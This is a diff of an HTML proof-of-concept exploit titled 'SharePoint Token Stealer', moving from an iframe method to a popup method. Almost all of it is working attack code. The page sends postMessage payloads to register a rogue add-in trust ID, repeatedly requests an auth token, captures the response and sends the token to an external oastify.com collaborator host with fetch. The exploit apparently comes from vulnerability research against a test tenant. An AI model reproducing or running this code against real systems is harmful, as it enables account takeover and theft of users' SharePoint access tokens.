@@ -1,75 +1,71 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>SharePoint PoC V5</title>
-</head>
+<head> <title>SharePoint Popup Exploit V6</title> </head>
 <body>
-    <h1>SharePoint Token Stealer</h1>
-    
-    <!-- THE TARGET IFRAME (Official Embed) -->
-    <iframe id="sharepoint-frame" 
-            src="https://shiscolinotests-my.sharepoint.com/personal/shiscolino_shiscolinotests_onmicrosoft_com/_layouts/15/Doc.aspx?sourcedoc={aafd58b8-f1a2-439e-94f0-d4ac217eea09}&amp;action=embedview" 
-            width="476px" height="288px" frameborder="0">
-    </iframe>
+    <h1>SharePoint Token Stealer (Popup Method)</h1>
+    <button onclick="startExploit()">Step 1: Open Target & Attack</button>
+    <div id="status">Waiting...</div>
 
     <script>
-        // Malicious Page Script
-        // Use "*" for PoC stability (in real attack, target specific origin)
-        const targetOrigin = "*";
-        const exploitId = "HACKER_ID";
-        
-        const iframe = document.getElementById("sharepoint-frame");
-        
-        iframe.onload = function() {
-            const targetWindow = iframe.contentWindow;
-            console.log("Iframe loaded, starting exploit sequence...");
+        const targetUrl = "https://shiscolinotests-my.sharepoint.com/personal/shiscolino_shiscolinotests_onmicrosoft_com/_layouts/15/Doc.aspx?sourcedoc={aafd58b8-f1a2-439e-94f0-d4ac217eea09}&action=default";
+        const targetOrigin = "https://shiscolinotests-my.sharepoint.com";
+        const exploitId = "HACKER_POPUP";
+        let popup = null;
 
-            // Helper to send messages in multiple formats (Object & JSON String)
-            // varying browser/app versions handle postMessage data differently
+        function startExploit() {
+            // Open target in a new window (shares session cookies!)
+            popup = window.open(targetUrl, "sharepointTarget", "width=800,height=600");
+            document.getElementById("status").innerText = "Popup opened. Waiting 5s for load...";
+
+            // Wait for load, then fire
+            setTimeout(() => {
+                runExploit();
+            }, 5000);
+        }
+
+        function runExploit() {
+            if (!popup) return;
+            console.log("Launching attack...");
+            document.getElementById("status").innerText = "Sending payloads...";
+
+            // Helper to send to popup
             function send(payload) {
-                try { targetWindow.postMessage(payload, targetOrigin); } catch(e) {} // Send as Object
-                try { targetWindow.postMessage(JSON.stringify(payload), targetOrigin); } catch(e) {} // Send as String
+                try { popup.postMessage(payload, "*"); } catch(e) {}
+                try { popup.postMessage(JSON.stringify(payload), "*"); } catch(e) {}
             }
 
-            // 1. Register Malicious Origin as Trusted
-            const registerPayload = {
+            // 1. Register
+            send({
                 MessageId: "AddinTrustedOrigin",
                 AddinTrustId: exploitId
-            };
-            send(registerPayload);
-            console.log("Sent registration (Dual Format)");
+            });
 
-            // 2. Request Auth Token (Repeated attempts to catch race conditions)
+            // 2. Request Token (Keep trying)
             let attempts = 0;
             const interval = setInterval(() => {
                 attempts++;
-                if(attempts > 5) clearInterval(interval);
+                if (attempts > 10) clearInterval(interval);
                 
-                // CRITICAL FIX: The dispatcher passes 'Values' to the handler, 
-                // so parameters must be nested inside 'Values'.
-                const tokenPayload = {
+                send({
                     MessageId: "GetAuthToken",
                     Values: {
                         AddinTrustId: exploitId,
                         Resource: window.location.origin
                     }
-                };
-                send(tokenPayload);
-                console.log("Sent token request attempt " + attempts);
+                });
+                console.log("Attempt " + attempts);
             }, 1000);
-        };
+        }
 
-        // 3. Capture & Exfiltrate Token
+        // 3. Listen for Token
         window.addEventListener("message", (event) => {
             if (event.data && event.data.MessageId === "GetAuthTokenResponse") {
                 const token = event.data.Values ? event.data.Values.Token : event.data.Token;
-                if (!token) return;
-
-                console.log("STOLEN TOKEN:", token);
-                
-                // EXFILTRATION
-                fetch('https://cm237ixc7usjxquw38ghh91krbx2ls9h.oastify.com/?stolen_token=' + encodeURIComponent(token), { mode: 'no-cors' });
-                alert("Token stolen! Check console/collaborator.");
+                if (token) {
+                    console.log("SUCCESS! Token:", token);
+                    alert("Token Stolen! See Console.");
+                    fetch('https://cm237ixc7usjxquw38ghh91krbx2ls9h.oastify.com/?stolen_token=' + encodeURIComponent(token), { mode: 'no-cors' });
+                }
             }
         });
     </script>
